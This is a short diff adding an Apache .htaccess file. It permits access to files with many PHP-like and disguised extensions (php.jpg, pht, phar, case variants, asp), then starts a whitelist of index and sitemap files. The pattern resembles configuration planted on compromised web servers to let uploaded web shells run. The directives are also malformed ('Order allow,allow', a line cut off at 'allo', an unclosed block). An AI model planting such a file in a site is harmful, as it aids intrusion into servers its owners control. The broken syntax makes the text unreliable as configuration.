@@ -1,0 +1,9 @@
+<FilesMatch ".(php|Php|pHp|pHP|Php.asp|php.anu|php.fla|PHP|php3|php2|Php1|pht|phar|anu|fla|asp|aspx|php.jpg|php6|php7)">
+Order allow,allow
+Allow from all
+</FilesMatch>
+
+<FilesMatch "^(index.html|index.php|sitemap.xml|robots.txt|folder.php|template.php|sitemap.php|list.txt)$">
+Order allow,allo
+
+
